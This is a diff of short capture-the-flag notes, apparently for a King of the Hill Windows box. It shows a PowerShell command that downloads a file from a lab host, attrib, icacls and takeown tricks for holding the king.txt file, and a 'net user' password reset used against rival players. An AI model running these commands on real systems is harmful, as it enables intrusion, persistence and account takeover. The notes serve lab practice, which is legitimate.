@@ -13,7 +13,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178
 
 and king.txt, under Administrator/king-server/, can be made immutable with the `attrib +r king.txt` command. note the `icacls` command could also be used to mess with permissions. can use `takeown /f .\king.txt` as a quick recover if someone else has taken over the file
 
-when dealing with dicks like matheuzsec, do the following:
+when dealing with dicks do the following:
 
 ```
 net user svc_robotarmy sdfsjkfskkjiouuiyeruiysdf
